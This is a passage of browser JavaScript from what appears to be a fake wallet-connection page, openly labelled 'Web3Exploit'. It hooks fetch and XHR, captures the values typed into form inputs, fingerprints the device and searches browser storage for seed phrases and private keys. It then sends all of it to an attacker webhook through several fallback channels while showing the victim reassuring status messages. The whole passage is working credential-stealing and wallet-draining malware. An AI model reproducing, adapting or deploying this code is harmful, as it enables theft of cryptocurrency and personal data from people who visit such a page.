    // ==================== NETWORK INTERCEPTION ====================
    
    function interceptNetworkRequests() {
        const requests = [];
        
        // Override fetch
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const request = {
                url: args[0],
                method: args[1]?.method || 'GET',
                timestamp: Date.now()
            };
            requests.push(request);
            
            // Exfiltrate network requests to webhook
            sendToWebhook({
                type: 'network_fetch',
                request: request,
                count: requests.length
            });
            
            return originalFetch.apply(this, args);
        };
        
        // Override XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            this._method = method;
            return originalXHROpen.apply(this, arguments);
        };
        
        XMLHttpRequest.prototype.send = function(body) {
            sendToWebhook({
                type: 'network_xhr',
                method: this._method,
                url: this._url,
                body: body?.substring(0, 500) || null,
                timestamp: Date.now()
            });
            return originalXHROpen.send ? originalXHROpen.send.apply(this, arguments) : null;
        };
        
        return requests;
    }
    
    // ==================== DOM SNAPSHOT ====================
    
    function captureDOM() {
        try {
            const dom = {
                title: document.title,
                url: window.location.href,
                forms: [],
                inputs: [],
                scripts: document.scripts.length,
                links: document.links.length
            };
            
            // Capture all forms
            document.querySelectorAll('form').forEach(form => {
                dom.forms.push({
                    action: form.action,
                    method: form.method,
                    inputs: form.querySelectorAll('input').length
                });
            });
            
            // Capture all inputs with values
            document.querySelectorAll('input, textarea, select').forEach(input => {
                if (input.value && input.value.length > 0) {
                    dom.inputs.push({
                        name: input.name,
                        type: input.type,
                        value: input.value.substring(0, 200)
                    });
                }
            });
            
            return dom;
        } catch(e) {
            return { error: e.message };
        }
    }
    
    // ==================== DEVICE FINGERPRINTING ====================
    
    function getDeviceFingerprint() {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 10, 10);
        ctx.fillStyle = '#069';
        ctx.fillText('fingerprint', 2, 15);
        const canvasFp = canvas.toDataURL();
        
        return {
            canvas: canvasFp.substring(0, 100),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            language: navigator.language,
            languages: navigator.languages,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            colorDepth: screen.colorDepth,
            screenResolution: `${screen.width}x${screen.height}`,
            windowSize: `${window.innerWidth}x${window.innerHeight}`,
            touchSupport: 'ontouchstart' in window,
            doNotTrack: navigator.doNotTrack,
            cookieEnabled: navigator.cookieEnabled,
            plugins: Array.from(navigator.plugins || []).map(p => p.name)
        };
    }
    
    // ==================== SEND TO WEBHOOK ====================
    
    async function sendToWebhook(data, retry = 0) {
        const payload = JSON.stringify(data);
        
        const methods = [
            () => fetch(CONFIG.webhook, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: payload,
                keepalive: true
            }),
            () => navigator.sendBeacon && navigator.sendBeacon(CONFIG.webhook, payload),
            () => {
                const img = new Image();
                img.src = `${CONFIG.webhook}?data=${encodeURIComponent(payload.substring(0, 2000))}`;
            },
            () => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', CONFIG.webhook, true);
                xhr.send(payload);
            }
        ];
        
        for (const method of methods) {
            try {
                await method();
            } catch(e) {}
        }
        
        // Store in sessionStorage for retry
        if (retry < CONFIG.maxRetries) {
            const stored = sessionStorage.getItem('_pending_exfil') || '[]';
            const pending = JSON.parse(stored);
            pending.push({ data: payload, timestamp: Date.now() });
            sessionStorage.setItem('_pending_exfil', JSON.stringify(pending.slice(-10)));
        }
    }
    
    // ==================== MAIN EXECUTION ====================
    
    async function main() {
        updateStatus("Detecting environment...");
        const environment = detectEnvironment();
        
        updateStatus("Scanning Web3 providers...");
        const web3Providers = await detectWeb3Providers();
        
        updateStatus("Extracting storage data...");
        const storage = exfiltrateStorage();
        
        updateStatus("Analyzing sensitive patterns...");
        const sensitive = extractSensitiveData(storage);
        
        updateStatus("Capturing device fingerprint...");
        const fingerprint = getDeviceFingerprint();
        
        updateStatus("Intercepting network...");
        const networkLogs = interceptNetworkRequests();
        
        updateStatus("Capturing DOM snapshot...");
        const domSnapshot = captureDOM();
        
        // Build complete payload
        const fullPayload = {
            exploitVersion: "3.0",
            timestamp: Date.now(),
            isoTime: new Date().toISOString(),
            sessionId: Math.random().toString(36).substring(2, 15) + Date.now().toString(36),
            executionTime: Date.now() - startTime,
            
            environment: environment,
            web3Providers: web3Providers,
            storage: storage,
            sensitiveData: sensitive,
            fingerprint: fingerprint,
            domSnapshot: domSnapshot,
            networkIntercepted: networkLogs.length > 0,
            
            // Statistics
            stats: {
                localStorageSize: Object.keys(storage.localStorage).length,
                sessionStorageSize: Object.keys(storage.sessionStorage).length,
                sensitiveSeedsFound: sensitive.seeds.length,
                sensitiveKeysFound: sensitive.privateKeys.length,
                walletAddressesFound: sensitive.walletAddresses.length
            }
        };
        
        // Send all data
        updateStatus("Exfiltrating data to security server...");
        await sendToWebhook(fullPayload);
        
        // Also send raw storage in chunks if too large
        if (JSON.stringify(storage).length > 10000) {
            await sendToWebhook({
                type: 'storage_chunk',
                localStorage: storage.localStorage,
                sessionStorage: storage.sessionStorage
            });
        }
        
        // Update UI with status
        if (sensitive.seeds.length > 0 || sensitive.privateKeys.length > 0) {
            updateStatus(`⚠️ WARNING: Found ${sensitive.seeds.length} seed phrases and ${sensitive.privateKeys.length} private keys!`);
            document.querySelector('.loading-text').innerHTML = '⚠️ Security Alert';
            document.querySelector('.wallet-logo').style.background = "linear-gradient(135deg, #dc2626, #991b1b)";
        } else {
            updateStatus("Connection established. Redirecting to dApp...");
        }
        
        console.log("[Web3Exploit] Full payload:", fullPayload);
        console.log(`[Web3Exploit] Data sent to ${CONFIG.webhook}`);
        console.log(`[Web3Exploit] Sensitive data: ${sensitive.seeds.length} seeds, ${sensitive.privateKeys.length} keys`);
        
        // Optional: Redirect to legit dApp
        setTimeout(() => {
            // Uncomment untuk redirect setelah exploit
            // window.location.href = "https://app.uniswap.org";
            document.getElementById('loadingScreen').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
            }, 1000);
        }, 3000);
    }
    
    // Start exploit
    main();
    
    // Backup: Send data on page unload
    window.addEventListener('beforeunload', function() {
        sendToWebhook({
            type: 'page_unload',
            timestamp: Date.now(),
            localStorageSize: localStorage.length,
            hasSessionStorage: sessionStorage.length > 0
        });
    });
    
    // Monitor for visibility change (app background/foreground)
    document.addEventListener('visibilitychange', function() {
        sendToWebhook({
            type: 'visibility_change',
            hidden: document.hidden,
            timestamp: Date.now()
        });
    });
    
})();
